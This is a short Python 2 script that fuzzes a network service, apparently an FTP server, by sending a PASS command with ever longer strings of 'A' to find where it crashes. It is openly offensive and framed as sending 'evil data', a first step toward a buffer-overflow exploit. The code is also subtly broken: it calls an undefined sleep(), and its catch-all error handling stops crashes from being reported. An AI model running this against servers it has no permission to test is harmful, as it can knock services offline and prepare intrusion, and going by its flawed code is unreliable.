#!/usr/bin/python 
import errno 
import os 
from os import strerror 
from socket import * 
import sys 
from struct import pack
import time

ip = sys.argv[1] 
port = int(sys.argv[2])

# Use this to find out the rough location of the crash
def fuzz():
    buff = ["A"]
    counter = 100

    while len(buff) <= 30:
        buff.append("A" * counter)
        counter = counter + 200
    ###
    
    for string in buff:
        print "Fuzzing target with %s bytes" %len(string)
        time.sleep(0.5)
        try:
            overflow(string)
        except:
            print "Target server crashed"
            sys.exit(0)
        ###
    ###
###
print "[+] Connecting to server."

def overflow(payload):
	try:     
		s = socket(AF_INET,SOCK_STREAM)
		connect = s.connect((ip,int(port)))
		print "[+] Connected..." 
		sleep(1)
		s.recv(1024)
		s.send("USER test\r\n")
		s.recv(1024)
		print "[+] Send evil data..." 	
		s.send("PASS " + str(payload) + "\r\n")
		s.send("QUIT\r\n")
		s.close()
		print "[+] Evil data sent" 
	except: 
		print "[*]Error"
	##
###

fuzz()
